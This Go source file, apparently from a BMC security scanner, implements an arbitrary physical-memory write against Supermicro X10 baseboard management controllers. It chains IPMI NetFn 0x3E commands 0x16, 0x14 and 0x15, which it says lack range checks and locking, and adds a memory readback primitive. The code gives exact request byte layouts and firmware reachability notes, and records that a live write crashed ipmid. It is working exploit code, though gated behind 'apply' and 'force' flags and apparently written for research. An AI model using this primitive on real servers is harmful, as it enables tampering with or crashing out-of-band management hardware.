package cmd

import (
	"context"
	"fmt"

	"github.com/runZeroInc/oobscan/pkg/ipmi"
)

// X10 "W9" arbitrary-memory write, implemented from the FW-4.00 static audit
// (kb/smc/notes/write-primitives-x10.md section 4): NetFn 0x3E cmd 0x16 maps physical
// 0x04f00000 (32 MiB) into ucpUpdateBuf, cmd 0x14 (SendBlockInfo) sets an UNCHECKED
// 32-bit offset, and cmd 0x15 (ReceiveFWData) copies attacker bytes to
// base+offset+running_count with no range check. None of the three takes the
// firmware-update lock. This is a second BMC-physical write primitive independent of
// the 0x30/0x70/0xC1 path - useful where 0xC1 is inert or absent.
//
// Reachability is Administrator on both FW 4.00 and FW 3.53 (the 0x3E table dispatches
// on 3.53 - verified live), but 3.53 has no 0x30/0x70/0xC0 read to self-verify against,
// so on 3.53 the writes fire and 'verify' reports the readback as unavailable.
const (
	fwBlockWindowBase = 0x04f00000
	fwBlockWindowSize = 0x02000000 // 32 MiB mapped by 0x3E/0x16
	fwBlockMaxChunk   = 254        // 0x15 copies datalen-1 bytes; keep <= 254 per request
)

func appendBE32(b []byte, v uint32) []byte {
	return append(b, byte(v>>24), byte(v>>16), byte(v>>8), byte(v))
}

// ipmiMemFWBlockWrite fires the 0x3E 0x16/0x14/0x15 sequence to write `data` at
// physical `addr` (which must fall inside the mapped 0x04f00000 window). Staged until
// 'apply'; with 'verify' it reads the target back through the profile's 0xC0 primitive.
func ipmiMemFWBlockWrite(ctx context.Context, sess *ipmi.CmdSess, p *ipmi.MemProfile, addr uint64, data []byte, o *ipmiMemOpts) (any, error) {
	_ = ctx
	if addr < fwBlockWindowBase || addr+uint64(len(data)) > fwBlockWindowBase+fwBlockWindowSize {
		return nil, fmt.Errorf("via=fwblock writes into the mapped window 0x%08x..0x%08x; target 0x%x (len %d) is outside it",
			fwBlockWindowBase, fwBlockWindowBase+fwBlockWindowSize, addr, len(data))
	}
	disp := uint32(addr - fwBlockWindowBase)
	res := map[string]any{
		"action":       "mem write",
		"space":        "physical",
		"via":          "fwblock",
		"transport":    "X10 W9: NetFn 0x3E 0x16 (map phys 0x04f00000) + 0x14 (offset) + 0x15 (write)",
		"address":      fmt.Sprintf("0x%08x", addr),
		"displacement": fmt.Sprintf("0x%x", disp),
		"length":       len(data),
	}
	res["hazard"] = "via=fwblock maps and writes physical 0x04f00000, an UNDECODED region on the AST2400: " +
		"a live write there CRASHED ipmid on FW 3.53 (session died; the BMC needed a reboot to recover). " +
		"This is a deliberate, board-risking action - and on FW 3.53 there is no 0xC0 readback to verify it. " +
		"Prefer the already-implemented 0x30/0x70/0xC1 write (profile smc-x10) where it exists."
	if !o.apply {
		res["applied"] = false
		res["note"] = "staged only: add BOTH 'apply' and 'force' to fire the 0x3E 0x16/0x14/0x15 sequence (add 'verify' to read it back via 0xC0)"
		res["wouldSend"] = fmt.Sprintf("3E 16 | 3E 14 [%08X][00000000][%08X][00][01] | 3E 15 [00][%d data bytes]", disp, uint32(len(data)), len(data))
		return res, nil
	}
	// The write CRASHED a live 3.53 BMC. Do not fire it on a bare 'apply' - require an
	// explicit 'force' acknowledgement of the board-crash risk.
	if !o.force {
		res["applied"] = false
		res["ok"] = false
		res["error"] = "refusing to fire a board-crashing write on 'apply' alone: add the bare token 'force' to acknowledge that this can take ipmid down and require a BMC reboot. See the 'hazard' field."
		return res, nil
	}

	// Step 0 - GetFWUpdateInfo: mmap physical 0x04f00000, 32 MiB, into ucpUpdateBuf.
	if cc, _, err := sess.ExecRaw(0x3E, 0x16, nil); err != nil {
		return nil, fmt.Errorf("GetFWUpdateInfo (0x3E/0x16): %w", err)
	} else if cc != 0x00 {
		res["ok"] = false
		res["mapCC"] = fmt.Sprintf("0x%02x", cc)
		res["error"] = fmt.Sprintf("GetFWUpdateInfo returned cc=0x%02x - the 0x04f00000 window did not map; W9 is unavailable on this build", cc)
		return res, nil
	}

	// Step 1 - SendBlockInfo: set the unchecked offset. data = [addr BE32][erase BE32][imgsz BE32][idx][blk].
	info := appendBE32(nil, disp)
	info = appendBE32(info, 0)                 // erase size - unused for the write itself
	info = appendBE32(info, uint32(len(data))) // image size
	info = append(info, 0x00, 0x01)            // image index, total blocks
	if cc, _, err := sess.ExecRaw(0x3E, 0x14, info); err != nil {
		return nil, fmt.Errorf("SendBlockInfo (0x3E/0x14): %w", err)
	} else if cc != 0x00 {
		res["ok"] = false
		res["error"] = fmt.Sprintf("SendBlockInfo returned cc=0x%02x", cc)
		return res, nil
	}

	// Step 2 - ReceiveFWData: write the bytes, chunked to <=254, flag=0 (never the last-block path,
	// which would run the finalize/verify arm and could touch flash state).
	for off := 0; off < len(data); off += fwBlockMaxChunk {
		end := min(off+fwBlockMaxChunk, len(data))
		req := append([]byte{0x00}, data[off:end]...) // req[0]=flag(0), req[1..]=bytes
		if cc, _, err := sess.ExecRaw(0x3E, 0x15, req); err != nil {
			return nil, fmt.Errorf("ReceiveFWData (0x3E/0x15) off=%d: %w", off, err)
		} else if cc != 0x00 {
			res["ok"] = false
			res["error"] = fmt.Sprintf("ReceiveFWData off=%d returned cc=0x%02x", off, cc)
			return res, nil
		}
	}
	res["applied"] = true
	res["ok"] = true
	res["note"] = "0x3E 0x16/0x14/0x15 all accepted (cc 0x00): the write bytes were copied to base+offset"

	if o.verify {
		rb, rerr := fwBlockReadback(sess, p, addr, len(data))
		switch {
		case rerr != nil:
			res["verify"] = "unavailable"
			res["verifyNote"] = fmt.Sprintf("0xC0 readback failed (%v) - expected on FW 3.53 where 0x30/0x70/0xC0 is absent; the write still fired", rerr)
		default:
			match := len(rb) == len(data)
			for i := range rb {
				if i >= len(data) || rb[i] != data[i] {
					match = false
					break
				}
			}
			res["verify"] = match
			res["readback"] = fmt.Sprintf("% x", rb)
		}
	}
	return res, nil
}

// fwBlockReadback reads len bytes at addr through the profile's 0x30/0x70/0xC0
// primitive (present on X10 4.00; absent on 3.53, where it errors and 'verify' says so).
func fwBlockReadback(sess *ipmi.CmdSess, p *ipmi.MemProfile, addr uint64, length int) ([]byte, error) {
	out := make([]byte, 0, length)
	for off := 0; off < length; off += 4 {
		a := uint32(addr) + uint32(off)
		n := byte(min(4, length-off))
		cc, resp, err := sess.ExecRaw(0x30, 0x70, []byte{0xC0, n, byte(a >> 24), byte(a >> 16), byte(a >> 8), byte(a)})
		if err != nil {
			return nil, err
		}
		if cc != 0x00 {
			return nil, fmt.Errorf("cc=0x%02x", cc)
		}
		// 0xC0 replies most-significant-byte-first; reverse to memory order.
		for i := len(resp) - 1; i >= 0; i-- {
			out = append(out, resp[i])
		}
	}
	if len(out) > length {
		out = out[:length]
	}
	return out, nil
}
